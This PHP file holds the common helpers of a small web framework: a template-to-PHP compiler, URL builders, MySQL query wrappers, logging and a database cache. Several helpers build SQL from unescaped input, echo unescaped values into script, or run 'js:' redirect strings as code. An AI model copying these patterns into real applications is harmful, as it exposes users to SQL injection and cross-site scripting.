<?php

/**
 * +----------------------------------------------------------------------
 * | 公共类、函数
 * +----------------------------------------------------------------------
 *                                            ...     .............
 *                                          ..   .:!o&*&&&&&ooooo&; .
 *                                        ..  .!*%*o!;.
 *                                      ..  !*%*!.      ...
 *                                     .  ;$$!.   .....
 *                          ........... .*#&   ...
 *                                     :$$: ...
 *                          .;;;;;;;:::#%      ...
 *                        . *@ooooo&&&#@***&&;.   .
 *                        . *@       .@%.::;&%$*!. . .
 *          ................!@;......$@:      :@@$.
 *                          .@!   ..!@&.:::::::*@@*.:..............
 *        . :!!!!!!!!!!ooooo&@$*%%%*#@&*&&&&&&&*@@$&&&oooooooooooo.
 *        . :!!!!!!!!;;!;;:::@#;::.;@*         *@@o
 *                           @$    &@!.....  .*@@&................
 *          ................:@* .  ##.     .o#@%;
 *                        . &@%..:;@$:;!o&*$#*;  ..
 *                        . ;@@#$$$@#**&o!;:   ..
 *                           :;:: !@;        ..
 *                               ;@*........
 *                       ....   !@* ..
 *                 ......    .!%$! ..        | AUTHOR: dfer
 *         ......        .;o*%*!  .          | EMAIL: df_business@qq.com
 *                .:;;o&***o;.   .           | QQ: 3504725309
 *        .;;!o&****&&o;:.    ..
 * +----------------------------------------------------------------------
 *
 */


// ********************** 常量 START **********************



/*
 * 枚举常量
 *
 * \Enum::reloadParent
 */
class Enum
{
    const goBack = 1;
    const reloadParent = 2;
    const reloadCurrent = 3;
    const logsConsole = 4;
    const logsSql = 5;
    const logsFile = 6;
    const sesName = 'df-ac-pw';
}




/**
 * 合成缓存文件
 * @param {Object} $layout	视图 - 布局页面
 * @param {Object} $other	true 公共页面 false 私有页面
 */
function view($layout_name, $base_area, $other)
{
    global $_df, $common;
    $area = $common->unHump($_df['area']);
    $ctrl = $common->unHump($_df['ctrl']);
    $func = $common->unHump($_df['action']);

    define('VIEW_ASSETS', is_file(ROOT . "/public/view/{$area}/public/assets") ? "/view/{$area}/public/assets" : "/view/{$base_area}/public/assets");

    $layout_name = $common->unHump($layout_name);
    //手机、pc分开调用模板
    //手机模板
    if ($common->isMobile() && WAP_PAGE_ENABLE) {
        //处理控制器之外的文件
        if ($other) {
            $layout_base = ROOT . "/public/view/{$area}/public/{$layout_name}_m.htm";
            $from = null;
            $to = ROOT . "/data/cache/areas/{$area}/view/public/{$layout_name}_m.php";
            $back = null;
            $layout = is_file($layout_base) ? $layout_base : (ROOT . "/public/view/{$base_area}/public/{$layout_name}_m.htm");
        } else {
            $layout_base = ROOT . "/public/view/{$area}/public/{$layout_name}_m.htm";
            $from_base = ROOT . "/public/view/{$area}/{$ctrl}/{$func}_m.htm";
            $from = !is_file($from_base) ? (ROOT . "/public/view/{$area}/{$ctrl}/{$func}.htm") : $from_base;
            $to = ROOT . "/data/cache/areas/{$area}/view/{$ctrl}/{$func}_m.php";
            $back = ROOT . "/areas/{$area}/controller/{$ctrl}controller.php";
            $layout = is_file($layout_base) ? $layout_base : (ROOT . "/public/view/{$base_area}/public/{$layout_name}.htm");
        }
    }
    //PC模板
    else {
        //处理控制器之外的文件
        if ($other) {
            $layout_base = ROOT . "/public/view/{$area}/public/{$layout_name}.htm";
            $from = null;
            $to = ROOT . "/data/cache/areas/{$area}/view/public/{$layout_name}.php";
            $back = null;
            $layout = is_file($layout_base) ? $layout_base : (ROOT . "/public/view/{$base_area}/public/{$layout_name}_m.htm");
        } else {
            //很奇怪无法获取php文件的修改时间，获取到的是空
            // 视图 - 布局页面
            $layout_base = ROOT . "/public/view/{$area}/public/{$layout_name}.htm";
            // 视图 - 静态页面
            $from = ROOT . "/public/view/{$area}/{$ctrl}/{$func}.htm";
            // 控制器文件
            $back = ROOT . "/areas/{$area}/controller/{$ctrl}controller.php";
            // 缓存文件
            $to = ROOT . "/data/cache/areas/{$area}/view/{$ctrl}/{$func}.php";
            // 视图 - 读取默认模板
            $layout = is_file($layout_base) ? $layout_base : (ROOT . "/public/view/{$base_area}/public/{$layout_name}.htm");
        }
    }
    //找不到该文件
    if ($from && !is_file($from)) {
        exit("错误: 视图文件 '{$from}' 不存在!");
    }
    //缓存文件 不存在 or 缓存文件 修改时间小于 视图 - 静态页面 、视图 - 布局页面 、控制器文件 or 处于测试状态
    if (!is_file($to) || filemtime($from) > filemtime($to) || filemtime($layout) > filemtime($to) || filemtime($back) > filemtime($to) || DEV) {
        //生成新的缓存
        viewConversion($from, $to, $layout);
    }
    // 直接读取缓存
    return $to;
}

function viewFront($layout = "common", $other = false)
{
    return view($layout, THEME_HOMEPAGE, $other);
}

function viewBack($layout = "common", $other = false)
{
    return view($layout, THEME_ADMIN, $other);
}

/**
 * 将html转化为php
 * @param {Object} $from
 * @param {Object} $to
 * @param {Object} $layout
 */
function viewConversion($from, $to, $layout)
{
    global $files;
    //获取文件目录
    $path = dirname($to);
    //创建目录
    $files->mkDirs($path);
    $content = viewReplace($from, $layout);
    //写入文件
    file_put_contents($to, $content);
}

/**
 * 读取html文件内容，并进行关键字替换
 * 所有代码必须通过header、body、footer标签进行加载
 * view文件里的标签之外的字符会被忽略
 *
 * 原理是把share文件作为框架来加载view页面
 *
 * 标签为主，特殊字符为辅
 *
 * 先将子页面的控件加载到主页面，然后替换关键语句
 * "df-code"必须放在控件里，不然不会运行
 * @param {Object} $from	源文件
 * @param {Object} $layout	布局文件
 */
function viewReplace($from, $layout)
{
    $from = $from ? file_get_contents($from) : null;
    if (empty($layout)) {
        return $from;
    }
    $layout = @file_get_contents($layout);

    //	echo $from;
    //preg_match的第一个参数用单引号还是双引号，效果一样
    preg_match("/<df-html>([\s\S]*?)<\/df-html>/", $from, $html);
    preg_match("/<df-header>([\s\S]*?)<\/df-header>/", $from, $header);
    preg_match("/<df-body>([\s\S]*?)<\/df-body>/", $from, $body);
    preg_match("/<df-footer>([\s\S]*?)<\/df-footer>/", $from, $footer);


    //布局
    if (count($html) == 0) {
        $html = ['', ''];
    }

    if (count($header) == 0) {
        $header = ['', ''];
    }
    if (count($body) == 0) {
        $body = ['', ''];
    }
    if (count($footer) == 0) {
        $footer = ['', ''];
    }

    $layout = preg_replace('/<df-html([\s\S]*?)\/>/', $html[1], $layout);
    $layout = preg_replace('/<df-header([\s\S]*?)\/>/', $header[1], $layout);
    $layout = preg_replace('/<df-body([\s\S]*?)\/>/', $body[1], $layout);
    $layout = preg_replace('/<df-footer([\s\S]*?)\/>/', $footer[1], $layout);
    //	var_dump($layout);die();
    //遍历list,需要提前替换
    $layout = preg_replace('/<df-each ([\s\S]*?)>/', '<?php $num=0; if(isset($1))foreach($1 as $k=>$v){  $num++;        ?>', $layout);
    $layout = preg_replace('/<\/df-each>/', '<?php } ?>', $layout);
    $layout = preg_replace('/!`([\s\S]*?)`/', '<?php echo $v["$1"] ?>', $layout); //提取list的值
    $layout = preg_replace('/<df-val value=\"([\s\S]*?)\"([\s\S]*?)\/>/', '<?php echo $v["$1"] ?>', $layout); //提取list的值

    //遍历缓存数据
    $layout = preg_replace('/<df-each-cache ([\s\S]*?)>/', '<?php if(isset($1)) foreach($1->{"data"} as $key=>$val){   ?>', $layout);
    $layout = preg_replace('/<\/df-each-cache>/', '<?php } ?>', $layout);
    $layout = preg_replace('/#`([\s\S]*?)`/', '<?php echo $val->{"$1"} ?>', $layout);
    $layout = preg_replace('/<df-val-cache value=\"([\s\S]*?)\"\/>/', '<?php echo $val->{"$1"} ?>', $layout);

    //组装if语句
    $layout = preg_replace('/<df-if ([\s\S]*?)>/', '<?php if($1){ ?>', $layout);
    $layout = preg_replace('/<df-elif ([\s\S]*?)>/', '<?php } else if($1){ ?>', $layout);
    $layout = preg_replace('/<df-else>/', '<?php } else{ ?>', $layout);
    $layout = preg_replace('/<\/df-if>/', '<?php } ?>', $layout);

    $layout = preg_replace('/!{if ([\s\S]*?)}/', '<?php if($1){ ?>', $layout);
    $layout = preg_replace('/!{elif ([\s\S]*?)}/', '<?php } else if($1){ ?>', $layout);
    $layout = preg_replace('/!{else}/', '<?php } else{ ?>', $layout);
    $layout = preg_replace('/!{\/if}/', '<?php } ?>', $layout);

    //执行代码，单行或多行
    $layout = preg_replace('/!{([\s\S]*?)}!/', '<?php $1 ?>', $layout);
    $layout = preg_replace('/<df-code>([\s\S]*?)<\/df-code>/', '<?php $1 ?>', $layout);

    //打印字符串，只能匹配单行
    $layout = preg_replace('/<df-print value=\"([\s\S]*?)\"\/>/', '<?php echo $1 ?>', $layout);
    $layout = preg_replace('/!!([\s\S]*?)!!/', '<?php echo $1 ?>', $layout);

    //防止关键字被非法格式化而进行注释，最后恢复被注释的内容
    $layout = preg_replace('/\/\*d([\s\S]*?)d\*\//', '$1', $layout);

    $layout = '' . $layout;
    return $layout;
}

/**
 * 实例化一个modules目录里的对象
 */
function m($name = '')
{
    if (stripos($name, '/') > -1) {
        // windows
        $model = is_file(ROOT . "modules/" . $name . '.php') ? ROOT . "modules/" . $name . '.php' : DF_PHP_ROOT . "modules/" . $name . '.php';
        if (!is_file($model)) {
            die(' Model ' . $model . ' Not Found!');
        }
        require $model;
        $name = explode('/', $name);
        $name = implode('\\', $name);
        $class_name = $name;
    } else {
        // linux
        $model = is_file(ROOT . "modules/{$name}.php") ? ROOT . "modules/{$name}.php" : DF_PHP_ROOT . "modules/{$name}.php";
        if (!is_file($model)) {
            die(' Model {$name} Not Found!');
        }
        require $model;
        //首字母变大写
        $class_name = $name;
    }

    $m = new $class_name();
    return $m;
}

//调用某个plugin文件，并new一个对象
function p($dir, $name = '')
{
    $model = ROOT . "module/" . strtolower($dir) . '/' . strtolower($name) . '.php';
    if (!is_file($model)) {
        die(' Model ' . $name . ' Not Found!');
    }
    require $model;
    //首字母变大写
    $class_name = ucfirst($name);
    $m = new $class_name();
    return $m;
}

//网页跳转的提示页面
function message($msg, $redirect = null)
{
    //直接跳转
    if (!$msg && $redirect) {
        header('location: ' . $redirect);
    } else {

        // 秒
        $delay = 1;
        // js脚本
        $script = "";

        switch ($redirect) {
            case \Enum::goBack:
                //返回之前的页面
                $script = "history.go(-2);";
                break;
            case \Enum::reloadParent:
                //刷新父页面
                $script = "parent.location.reload();";
                break;
            case \Enum::reloadCurrent:
                //刷新当前页面
                $script = "location.reload();";
                break;
            default:
                if ($js = strstr($redirect, "js:")) {
                    // 执行js代码
                    $script = "{$js}";
                } else {
                    $redirect = splitUrl($redirect);
                    $script = "location.href = '{$redirect}';";
                }
                break;
        }
        // var_dump($redirect);
        include viewBack('message', true);
    }
    exit();
}

/*
 * 原生js弹窗。网页会终止运行
 *
 * ['error', 'warning', 'info', 'success', 'input', 'prompt']
 */
function showMessage($title = 'df', $msg = '', $return_url = null, $type = 'warning')
{

    //擦除之前的所有显示数据
    ob_end_clean();
    if ($return_url == "reload") {
        $jump = "location.reload()";
    } elseif (empty($return_url)) {
        $jump = "";
    } else {
        $jump = sprintf('location.href="%s"', $return_url);
    }
    include viewBack('message', true);
    die();
}

/**
 * 拆分url参数，组成访问地址
 *
 * eg:
 * splitUrl("A/c/a/para",array(zdy=>$zdy))
 * splitUrl("wx/home/share_manage_show/{$v[0]}",array(wx_id=>$_df['wx_id']))
 * @param {Object} $str	url字符串
 * @param {Object} $get	get参数	数组
 */
function splitUrl($str, $get = null)
{
    //去掉字符串首尾空格
    $str = trim($str);
    $s = explode("/", $str);
    //单个路径就直接跳转
    if (count($s) == 1 || $str == '/') {
        return SITE . $s[0];
    }
    //去掉元素的首尾空格
    for ($i = 0; $i < count($s); $i++) {
        $s[$i] = trim($s[$i]);
    }

    //防止数组添加新的项之后影响后续判断
    if (count($s) < 4) {
        $s[3] = "";
    }
    //设置默认值
    if (count($s) < 3) {
        $s[2] = "index";
    }
    if (empty($s[2])) {
        $s[2] = "index";
    }

    $s[4] = '';
    //增加多参数
    if (is_array($get)) {
        foreach ($get as $key => $val) {
            $s[4] .= sprintf('&%s=%s', $key, $val);
        }
    }

    //$rt=SITE."index.php?A={$s[0]}&c={$s[1]}&a={$s[2]}&para={$s[3]}{$s[4]}";
    $rt = SITE . "{$s[0]}/{$s[1]}/{$s[2]}/{$s[3]}{$s[4]}";
    return $rt;
}


/**
 *
 *	拼接url地址，组成访问地址
 *
 * eg:
 * url("admin","home",self::$db_menu."add",$v[0],array("parent_id"=>$param,"parent"=>$parent))
 *
 * @param {Object} $area	区域
 * @param {Object} $ctrl	控制器
 * @param {Object} $action	方法
 * @param {Object} $param	参数 字符串或者数组
 * @param {Object} $get	get参数	数组
 */
function url($area, $ctrl = null, $action = null, $param = null, $get = null)
{
    //去掉首尾空格
    $area = trim($area);
    $ctrl = $ctrl ? trim($ctrl) : 'home';
    $action = $action ? trim($action) : 'index';

    if ($area == '/') {
        return SITE;
    }
    // 内置参数
    if ($param) {
        $param = is_array($param) ? implode("/", $param) : trim($param);
    }

    // get参数
    $get_str = '?';
    if ($get && is_array($get)) {
        foreach ($get as $key => $val) {
            $get_str .= sprintf('&%s=%s', $key, $val);
        }
    }

    $rt = sprintf("%s/%s/%s/%s/%s%s", SITE, $area, $ctrl, $action, $param, $get_str);
    return $rt;
}

// ###################################### database START ######################################


/**
 * 数据库连接初始化
 * @param {Object} $var 变量
 **/
function dbInit()
{
    global $other;
    $con = mysqli_connect(SERVER, ACC, PWD);
    if (!$con) {
        echo "服务器 [" . SERVER . "] 连接失败";
        echo "<br>";
        die();
    }
    $database = DATABASE;
    try {
        // ###################################### 连接数据库 START ######################################
        if (mysqli_select_db($con, $database)) {
            //数据库存在
            @$db = new MySQLi(SERVER, ACC, PWD, $database);
            //连接数据库，忽略错误
            //当bool1为false就会执行bool2，当数据库出错就会输出字符并终止程序
            !mysqli_connect_error() or die("数据库 [{$database}] 错误");
            //防止乱码
            $db->query('set names utf8');
        } else {
            throw new \mysqli_sql_exception;
        }
        // ######################################  连接数据库 END  ######################################
    } catch (\Exception $exc) {
        // ###################################### 创建数据库 START ######################################
        if (mysqli_query($con, "CREATE DATABASE {$database}")) {
            echo str("数据库 {0} 创建成功 <br /> {1}", [$database, PHP_EOL]);
            @$db = new \MySQLi(SERVER, ACC, PWD, $database);
            !mysqli_connect_error() or die("数据库 [{$database}] 错误");
            $db->query('set names utf8');
            if ($other->createDb($db)) {
                die(<<<STR
							<br />
							<a target='' href='/'>进入主页</a>
							<br />
							<a href='javascript:location.reload()'>刷新...</a>
							<script>
							setTimeout(()=>{location.reload()},3000);
							</script>
							STR);
            }
        } else {
            die(str("{0} 创建失败: {1}", [$database, mysqli_error($con)]));
        }
        // ######################################  创建数据库 END  ######################################
    }

    return $db;
}

/*
 * 简洁执行sql语句
 *
 *
 */
function sql($sql)
{
    global $db;
    $sql = trim($sql);
    //echo $sql;
    //查询
    $o = strtolower(substr($sql, 0, 4));
    if ($o == "sele" || $o == 'show') {
        $r = $db->query($sql);
        if ($r->num_rows > 0) {
            $rt = $r->fetch_all(MYSQLI_BOTH);
        } //返回编号和字段名
        else {
            $rt = array();
        }
    }
    //执行
    else {
        $db->query($sql);
        //返回新插入的数据id
        if ($o == "inse") {
            $rt = $db->insert_id;
        } else {
            //受影响行数
            $rt = $db->affected_rows;
        }
        $rt = $rt ? $rt : false;
    }

    //容错处理
    if (!empty($db->error)) {
        $err = sprintf("语句：%s\r\n错误信息：%s", $sql, json_encode($db->error));
        //echo $err;
        logs($err, 'sql err');
        //die();
        $rt = false;
    }
    return $rt;
}

/*
 * 运行sql
 *
 * 有容错处理
 */
function query($sql)
{
    global $db;
    debug($sql);
    $r = $db->query($sql);
    //容错处理
    if (!empty($db->error)) {
        echo ($db->error);
        $err = sprintf("语句：%s\r\n错误信息：%s", $sql, json_encode($db->error));
        logs($err, 'sql错误');
        //die();
    }
    return $r;
}

/*
 * 查询字符串格式化
 *
 *
 * 多列
 * queryFormat('df',['type'=>1,'parent_id'=>2],['time','desc'],[0,1]); *
 * queryFormat('df',['type'=>1],['time','desc'],10);
 * queryFormat('df',['type'=>1],['time','desc']);
 * queryFormat('df',['type'=>1]);
 *
 *
 * 单列
 * 默认para为id
 * queryFormat('df',1);
 * queryFormat('df',['type'=>1]);
 *
 */
function queryFormat($tb, $para = array(), $order = array(), $limit = array())
{
    if (empty($tb)) {
        return array();
    }

    //拼接where
    if (empty($para)) {
        $where = '';
    } elseif (is_numeric($para)) {
        $where = 'where id=' . $para;
    } elseif (is_string($para)) {
        $where = 'where ' . $para;
    } elseif (is_array($para)) {
        $where = 'where 1=1';
        if (!empty($para)) {
            foreach ($para as $key => $value) {
                if ($value === null) {
                    $where .= sprintf(" and `%s` is null", $key);
                } else {
                    $where .= sprintf(" and `%s`='%s'", $key, $value);
                }
            }
        }
    }


    //拼接order
    if (empty($order)) {
        $order = '';
    } elseif (is_string($order)) {
        $order = 'order by id ' . $order;
    } elseif (is_array($order)) {
        if (count($order) == 2) {
            $order = sprintf('order by %s %s', $order[0], $order[1]);
        } else {
            $order = sprintf('order by %s %s', array_key_first($order), $order[array_key_first($order)]);
        }
    }


    //拼接limit
    if (empty($limit)) {
        $limit = '';
    } else {
        if (is_array($limit)) {
            $limit = sprintf('limit %s,%s', $limit[0], $limit[1]);
        } elseif (is_numeric($limit)) {
            $limit = sprintf('limit %s', $limit);
        }
    }

    //带条件获取整个表的数据
    $sqlString = sprintf("select * from `%s` %s %s %s", $tb, $where, $order, $limit); //sql语句的表名区分大小写

    // var_dump([$sqlString,$tb, $where,$order, $limit]);

    return $sqlString;
}

/*
 * 根据字段类型获取默认值
 *
 *
 */
function getTypeValue($tb, $column)
{
    $sql = sprintf("SELECT
 NUMERIC_SCALE,COLUMN_NAME,DATA_TYPE
FROM
    information_schema. COLUMNS
WHERE TABLE_NAME = '%s' and COLUMN_NAME='%s';
", $tb, $column);
    $dt = show($sql);
    $value = $dt[0][0];
    return $value;
}

/*
 * 格式化更新语句
 *
 * 新增
 * queryFormat_other('df',['title'=>1]);
 *
 *
 * 更新
 * queryFormat_other('df',['title'=>1],['type'=>1]); *
 * 默认para为id
 * queryFormat_other('df',['title'=>1],3);
 *
 */
function queryFormatUpdateInsert($tb, $data = array(), $para = array())
{
    global $db;
    if (empty($tb) || empty($data)) {
        return array();
    }

    //新增
    if (empty($para)) {
        $data_str = $data_str_key = $data_str_val = '';
        if (!empty($data)) {
            foreach ($data as $key => $value) {
                if (empty($value)) {
                    $value = getTypeValue($tb, $key);
                } elseif (is_int($value)) {
                    $value = intval($value);
                } else {
                    $value = mysqli_escape_string($db, $value);
                }
                $data_str_key .= sprintf("`%s`,", $key);
                $data_str_val .= sprintf("'%s',", $value);
            }
        }
        //去掉尾部逗号
        $data_str_key = substr($data_str_key, 0, -1);
        $data_str_val = substr($data_str_val, 0, -1);
        $data_str = sprintf('(%s) values(%s)', $data_str_key, $data_str_val);



        $sqlString = sprintf("insert into `%s` %s", $tb, $data_str); //sql语句的表名区分大小写
    }
    //编辑
    else {
        $data_str = 'set';
        if (!empty($data)) {
            foreach ($data as $key => $value) {
                if (empty($value)) {
                    $value = getTypeValue($tb, $key);
                } elseif (is_int($value)) {
                    $value = intval($value);
                } else {
                    $value = mysqli_escape_string($db, $value);
                }
                $data_str .= sprintf(" `%s`='%s',", $key, $value);
            }
        }
        //去掉尾部逗号
        $data_str = substr($data_str, 0, -1);


        //拼接where
        if (is_numeric($para)) {
            $where = 'where id=' . $para;
        } elseif (is_string($para)) {
            $where = 'where ' . $para;
        } else {
            $where = 'where 1=1';
            if (!empty($para)) {
                foreach ($para as $key => $value) {
                    $where .= sprintf(" and `%s`='%s'", $key, $value);
                }
            }
        }


        $sqlString = sprintf("update `%s` %s %s", $tb, $data_str, $where); //sql语句的表名区分大小写
    }
    //var_dump($sqlString);die();
    return $sqlString;
}

/*
 * 删除数据
 *
 * queryFormatDel('df',['type'=>3])
 *
 * 根据id删除
 * queryFormatDel('df',5)
 *
 * 清空表
 * queryFormatDel('df')
 *
 */
function queryFormatDel($tb, $para = array())
{
    global $db;
    if (empty($tb)) {
        return array();
    }

    //拼接where
    if (is_numeric($para)) {
        $where = 'where id=' . $para;
    } elseif (is_string($para)) {
        $where = 'where ' . $para;
    } else {
        $where = 'where 1=1';
        if (!empty($para)) {
            foreach ($para as $key => $value) {
                $where .= sprintf(" and `%s`='%s'", $key, $value);
            }
        }
    }

    $sqlString = sprintf("delete from `%s` %s", $tb, $where); //sql语句的表名区分大小写

    return $sqlString;
}

/*
 * 执行sql语句
 * 返回数组
 *
 *
 */
function show($sql)
{
    $r = query($sql);
    //始终返回数组
    $rt = $r->fetch_all(MYSQLI_BOTH);
    $rt = empty($rt) ? array() : $rt;
    return $rt;
}

/*
 *
 * 输出表格数据
 *
 * 返回数组
 */
function showList($tb, $para = array(), $order = array(), $limit = array())
{
    $sql = queryFormat($tb, $para, $order, $limit);
    $rt = show($sql);
    return $rt;
}

/*
 * 读取首条数据
 *
 *
 */
function showFirst($tb, $para = array(), $order = array(), $limit = array())
{
    $sql = queryFormat($tb, $para, $order, $limit);
    $r = query($sql);
    $rt = $r->fetch_array(MYSQLI_BOTH);
    return $rt;
}

/*
 *
 * 多行则返回数组
 * 单行则返回键值对
 *
 */
function showAuto($tb, $para = array(), $order = array(), $limit = array())
{
    $sql = queryFormat($tb, $para, $order, $limit);

    $r = query($sql);


    //多条
    if ($r->num_rows > 1) {
        $rt = $r->fetch_all(MYSQLI_BOTH);
    }
    //单条
    else {
        //读取首条数据
        $rt = $r->fetch_array(MYSQLI_BOTH);
    }

    $rt = empty($rt) ? array() : $rt;
    return $rt;
}


/*
 *
 *
 * 编辑
 * $rt=update('df',['key'=>'xxx'],['id'=>3])
 * $rt=update('df',['key'=>'xxx'],3)
 *
 * update('df',['key'=>'xxx'],3,"homepage/column/".$db_hc)
 * update('df',['key'=>'xxx'],3,Enum.goBack)
 *
 */
function update($tb, $data = array(), $para = array(), $redirect = null)
{
    $sql = queryFormatUpdateInsert($tb, $data, $para);
    $return = 0;
    //新增
    if (empty($para) || (isset($para["id"]) && $para["id"] == 0) || (isset($para["id"]) && $para["id"] == 0) || (isset($para["ID"]) && $para["ID"] == 0)) {
        $return = insert($tb, $data, $redirect);
    }
    //编辑
    else {
        //开启事务。防止高并发
        query("START TRANSACTION");
        $r = query($sql);
        //提交事务
        query("COMMIT");
        if ($r) {
            $return = 1;
        }
    }
    if ($return > 0) {
        //什么都不执行
        if ($redirect == null) {
            return $return;
        } else {
            message('操作成功', $redirect);
        }
    } else {
        return $return;
    }
}

/*
 * 新增
 *
 * 获取新行id
 * $id=insert('df',['key'=>'xxx'])
 *
 * 跳转
 * insert('df',['key'=>'xxx'],Enum.goBack)
 *
 *
 */
function insert($tb, $data = array(), $redirect = null)
{
    $sql = queryFormatUpdateInsert($tb, $data);
    //开启事务。防止高并发
    query("START TRANSACTION");
    $r = query($sql);
    //提交事务
    query("COMMIT");
    $return = 0;
    if ($r) {
        $return = show('SELECT LAST_INSERT_ID()');
        $return = $return[0][0]; //返回新增的id
    }
    if ($return > 0) {
        //什么都不执行
        if ($redirect == null) {
            return $return;
        } else {
            message('操作成功', $redirect);
        }
    } else {
        return $return;
    }
}

/*
 * 删除数据
 *
 * 根据条件删除
 * del('df',['type'=>3])
 *
 * 默认根据id删除
 * del('df',5)
 *
 * 清空表
 * del('df')
 *
 * 跳转
 * del('df',['key'=>'xxx'],Enum.goBack)
 *
 */
function del($tb, $para = array(), $redirect = null)
{
    global $db;
    $return = 0;

    $sql = queryFormatDel($tb, $para);
    $r = query($sql);

    if ($r) {
        $return = 1;
    }

    if ($return > 0) {
        //什么都不执行
        if ($redirect == null) {
            return $return;
        } else {
            message('操作成功', $redirect);
        }
    } else {
        return $return;
    }
}

//执行sql语句
function exe($sql)
{
    global $db;
    $return = 0;
    $r = query($sql);
    if ($r) {
        $return = 1;
    }
    return $return;
}

/*
 * dataTable依赖
 *
 * 分页处理
 *
 *
 * showPage($db_Statistics,[],"Df_web_mng/data/".$db_Statistics);
 *
 */
function showPage($tb, $para = array(), $url = '')
{

    global $common;
    if ($_POST) {
        $start = $_POST['start'];
        $length = $_POST['length'];

        $search = $_POST['search']['value'];
        $order_column = $_POST['order'][0]['column'];
        $order_column = $_POST['columns'][$order_column]['data'];
        $order_type = $_POST['order'][0]['dir'];
        $order = [$order_column, $order_type];
        //var_dump($order_column,$_POST['order'][0]['column'],$_POST['columns']);

        $total_count = show(sprintf("select count(*) from %s", $tb))[0][0];
        $data = showList($tb, $para, $order, [$start, $length]);
        $data_rt = array();
        if (!empty($url)) {
            foreach ($data as $key => $value) {
                $url_view = splitUrl(sprintf("%s_view/%s", $url, $value[0]));
                $url_edit = splitUrl(sprintf("%s_add/%s", $url, $value[0]));
                $url_del = splitUrl(sprintf("%s_del/%s", $url, $value[0]));
                $opt = <<<EOT
<a href='{$url_view}'>[预览]</a>
<a href='{$url_edit}'>[编辑]</a>
<a href='{$url_del}' onclick='return confirm("您确认要删除吗？")'>[删除]</a>
EOT;

                $value['opt'] = $opt;
                $data_rt[] = $value;
            }
        }

        $return = array(
            'draw' => $_POST['draw'],
            'recordsTotal' => $total_count,
            'recordsFiltered' => $total_count,
            'data' => $data_rt,
            'error' => ''
        );

        $common->showJsonBase($return);
    }
}

/*
 *第一个参数为空就调用第二个参数
 */
function setVal($default, $other)
{
    $rt = empty($default) ? $other : $default;
    return $rt;
}
/*
 *将表中的所有字段初始化为空字符串
 *数据不存在的时候用来填充数据
 *
 */
function tableInit($table)
{
    global $database;
    //获取表字段名、类型、备注
    $r = show(sprintf("select column_name,data_type,column_comment from information_schema.COLUMNS where table_name = '%s' and table_schema = '%s'", $table, $database));
    //unset($r[0]);

    $item = [];
    //var_dump($r);
    foreach ($r as $v) {
        $name = $v[0];
        $type = $v[1];
        if ($type == "int") {
            $item[$name] = 0;
        } else {
            $item[$name] = "";
        }
    }
    return $item;
}

/*
 * 连接sql服务器，执行sql语句
 * 单刀插入数据（无视一切规则，强行添加）
 * 支持远程连接
 *
 */
function add($tb, $data)
{
    $server = "localhost";
    $acc = "mysql account";
    $pwd = "mysql password";
    $database = "database name";
    @$db = new MySQLi($server, $acc, $pwd, $database); //阻止显示错误
    $sql1 = '';
    $sql2 = '';
    foreach ($data as $key => $val) {
        $sql1 = $sql1 . $key . ',';
        $sql2 = $sql2 . "'" . $val . "',";
    }
    $sql1 = substr($sql1, 0, strlen($sql1) - 1);
    $sql2 = substr($sql2, 0, strlen($sql2) - 1);
    $sql = "insert into `{$tb}`({$sql1}) values({$sql2})";
    logs($sql, 2);
    //echo $tb.$sql1.$sql2.$sql;
    $r = query($sql);
    return $r;
}


/**
 * 判断表是否存在
 * @param {Object} $table
 */
function tableExist($table = 'cache')
{
    global $db;
    $result = $db->query("SHOW TABLES LIKE '" . $table . "'");
    $row = $result->fetch_all();
    if (!count($row)) {
        die("Table does not exist<br><a href='create.php'>创建数据库</a>");
    }
}

/*开始事务
 *
 *停用自动提交
 *检测表是否支持事务
 */
function begin($table = array())
{
    global $db;
    //关闭自动提交
    $db->autocommit(false);
    if (!empty($table)) {
        $table = is_array($table) ? $table : array($table);
        foreach ($table as $v) {
            $Engine = query("show table status like '$v'");
            $Engine = strtolower($Engine[0]['Engine']);
            if ($Engine != 'innodb') {
                die("$table表类型必须是InnoDB");
            }
        }
    }
}

/*结束事务
 *
 * 提交数据
 *
 */
function commit()
{
    global $db;
    $db->commit();
    //恢复自动提交
    $db->autocommit(true);
}

//回滚
function back()
{
    global $db;
    $db->rollback();
}

//关闭连接
function close()
{
    global $db;
    $db->close();
}

/*
 *根据sql的返回值调用事务
 *
 *执行sql失败就回滚
 */
function affair($v)
{
    global $common;
    if (!$v) {
        back();
        $common->showJson('202', '账户收款失败');
    }
}
// ######################################  database END  ######################################

/**
 * 用来输出日志
 *
 * @param {Object} $str
 * @param {Object} $type	类型
 * @param {Object} $override	是否覆盖（默认不覆盖）
 */
function logs($str, $type = \Enum::logsFile, $override = false)
{
    global $db, $common, $files;
    $str = $common->str($str);
    $time = $common->getTime(TIMESTAMP);
    switch ($type) {
        case \Enum::logsConsole:
            //打印到浏览器控制台
            echo "<script>console.log('数据：')</script>";
            echo "<script>console.log('{$str}')</script>";
            echo "<script>alert('{$str}')</script>";
            break;
        case \Enum::logsSql:
            // 必须单独调用sql，因为这是底层函数，很多高级函数依赖于此函数
            if ($override) {
                $db->query("delete from logs;");
                $db->query(sprintf('insert into logs(str,time) values("%s","%s");', $str, $time));
            } else {
                $db->query(sprintf('insert into logs(str,time) values("%s","%s");', $str, $time));
            }
            break;
        case \Enum::logsFile:
            $file_dir = str("{root}/data/logs/{0}", [date('Ym'), "root" => ROOT]);

            $files->mkDirs($file_dir);

            // $path="/www/wwwroot/dfphp.dfer.site/data/logs";
            // 		var_dump($path,is_dir($path));;die;
            $files->writeFile(str("{0}\n{1}\n\n", [$str, $time]), str("{0}/{1}.log", [$file_dir, date('d')]), "a");
            break;
        default:
            break;
    }
}



// ###################################### cache START ######################################

/**
 * 服务器缓存
 * eg:
 * $home_layout=json_decode(cache_r("home_layout"));
 * @param {Object} $key
 */
function cacheR($key)
{
    $cachedata = showFirst("cache", ["key" => $key]);
    //	  var_dump(empty($cachedata));die();
    if (empty($cachedata)) {
        return '';
    }
    return $cachedata['value'];
}

/**
 * 插入及更新
 * eg:
 * $home_layout = showFirst("home_layout",1);
 * cache_w("home_layout",$home_layout);
 * @param {Object} $key
 * @param {Object} $data
 */
function cacheW($key, $data)
{
    if (empty($key) || !isset($data)) {
        return false;
    }
    $record = array();
    $record['key'] = $key;
    $record['value'] = $data;
    $cachedata = showFirst("cache", ["key" => $key]);
    if (empty($cachedata)) {
        return insert("cache", $record);
    } else {
        return update("cache", $record, ["key" => $key]);
    }
}

function cacheDel($key)
{
    $result = del("cache", ["key" => $key]);
    return $result;
}

function cacheClean()
{
    $result = del("cache");
    return $result;
}


// ######################################  cache END  ######################################


